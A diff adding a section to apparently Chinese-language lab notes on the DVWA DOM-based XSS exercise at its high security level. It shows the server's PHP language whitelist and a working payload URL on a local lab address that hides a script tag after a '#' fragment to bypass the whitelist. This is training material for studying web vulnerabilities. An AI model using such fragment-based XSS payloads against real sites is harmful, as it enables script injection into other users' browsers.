@@ -92,3 +92,41 @@ http://192.168.0.111:8000/vulnerabilities/xss_d/?default=English%3C/select%3E%3C
 
 
 
+### 3. high
+
+> 高级
+
+```php
+
+<?php
+
+// Is there any input?
+if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
+
+    # White list the allowable languages
+    switch ($_GET['default']) {
+        case "French":
+        case "English":
+        case "German":
+        case "Spanish":
+            # ok
+            break;
+        default:
+            header ("location: ?default=English");
+            exit;
+    }
+}
+```
+
+> 逻辑方面的漏洞
+>
+> ```php
+> # php 注释
+> <! -- 注释 -- >
+> ```
+
+```shell
+# get参数，把#后面的代码注释了。返回到前端了
+http://192.168.0.111:8000/vulnerabilities/xss_d/?default=French#%3Cscript%3Ealert(/xss/)%3C/script%3E
+```
+
